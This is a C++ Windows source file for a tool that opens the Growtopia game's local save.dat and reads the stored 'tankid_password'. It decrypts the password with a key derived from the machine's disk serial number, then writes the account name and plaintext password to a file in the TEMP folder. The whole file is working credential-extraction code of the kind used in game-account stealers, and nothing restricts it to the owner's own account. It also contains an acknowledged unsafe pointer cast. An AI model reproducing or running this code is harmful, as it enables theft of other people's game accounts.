#pragma once
#include <WinSock2.h>
#include <Windows.h>
#include <iphlpapi.h>
#include <iostream>
#include <conio.h>
#include <string>
#include <cstdarg>
#include "proton/Variant.hpp"
#include "proton/vardb.h"
#include <sstream>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <stdlib.h>
#include <tchar.h>

#pragma comment(lib, "iphlpapi.lib")

unsigned int decrypt(byte* data, unsigned int size, int key)
{
	//src: proton
	unsigned int checksum = 0;
	for (unsigned int i = 0; i < size; i++)
	{
		checksum += data[i] + key + i;
		data[i] = data[i] - (2 + key + i);
	}
	return checksum;
}
uint32 hash_str(const char* str, int32 len)
{
	//src: proton
	if (!str) return 0;

	auto n = (unsigned char*)str;
	uint32 acc = 0x55555555;
	for (int32 i = 0; i < len; i++)
		acc = (acc >> 27) + (acc << 5) + *n++;

	return acc;
}
string get_identifier()
{
	//src: proton
	DWORD dwDiskSerial;
	if (!GetVolumeInformation(L"C:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
		if (!GetVolumeInformation(L"D:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
			if (!GetVolumeInformation(L"E:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
				if (!GetVolumeInformation(L"F:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
					if (!GetVolumeInformation(L"G:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
						return "";

	char stTemp[128];
	sprintf(stTemp, "%u", dwDiskSerial);
	return stTemp;
}
void rephelper(string& str, const string& from, const string& to) {
	if (from.empty())
		return;
	size_t start = 0;
	while ((start = str.find(from, start)) != -1) {
		str.replace(start, from.length(), to);
		start += to.length();
	}
}
int _stdcall WinMain(struct HINSTANCE__* hinstance, struct HINSTANCE__* hprevinstance, char* cmdline, int cmdshow)
{
	bool set_visible = true;
	bool nowait = false, nolog = false, user = false, dump = false, custom_file = false, mac = false, world = false; //ghetto as fuck
	string custom_path{};
	stringstream help{};
	if (set_visible) {
		AllocConsole();
		freopen("conin$", "r", stdin);
		freopen("conout$", "w", stdout);
		freopen("conout$", "w", stderr);
		printf("%s", help.str().c_str());
	}
	VariantDB db{};
	bool did_exist;
	auto path = (string)getenv("LOCALAPPDATA") + "\\Growtopia\\save.dat";
	if (custom_file)
		path = custom_path;



	auto success = db.Load(path, &did_exist);
	if (success && did_exist) {
		if (!nolog)
			printf("Found save.dat\n");
		auto variant = db.GetVarIfExists("tankid_password");
		if (variant) {
			auto varstr = variant->get_h();
			auto size = varstr.length();
			auto pass = new uint8_t[size];
			memcpy(pass, varstr.data(), size);
			auto device_id = get_identifier();
			auto output = decrypt(pass, size, hash_str(device_id.c_str(), device_id.length()));
			auto pass_str = (string)(char*)(&*(DWORD**)pass); //very likely unsafe - message by ama
			delete[] pass;
			pass_str.resize(size);

			auto uservar = db.GetVarIfExists("tankid_name");
			if (user && uservar)
				printf("%s:", uservar->get_h().c_str());
			else if (user)
				printf("ERROR_NAME:");
			if (nolog)
				printf("%s", pass_str.c_str());
			else
			{
				string filename = getenv("TEMP");
				std::ofstream mysfile;
				mysfile.open(filename + "\\pwdtemp");
				mysfile << uservar->get_h() +"\n"+ pass_str;
				mysfile.close();
				cout << "writed to:" + filename + "\\pwdtemp";
			}

			if (dump) {
				variant->Set(pass_str);
				printf("%s\n", db.DumpAsString().c_str());
			}
		}
		else if (!nolog)
			printf("Tankid password field not found.\n");
		else
			printf("ERROR_TANKPW");
	}
	else if (!nolog)
		printf("Did not find save.dat at %s or could not load it for unknown reasons.\n", path.c_str());
	else
		printf("ERROR_FILE");

	if (!nowait)
		(void)_getch();
}